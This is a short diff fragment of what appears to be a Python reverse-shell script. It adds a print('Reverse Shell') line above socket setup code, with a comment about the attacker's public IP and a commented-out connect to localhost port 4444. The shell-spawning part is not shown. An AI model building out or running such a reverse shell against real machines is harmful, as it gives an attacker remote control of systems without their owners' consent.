@@ -1,4 +1,5 @@
 import socket,subprocess,os
+print("Reverse Shell")
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 #public internet IP of attacker machine
 #s.connect(("127.0.0.1",4444))
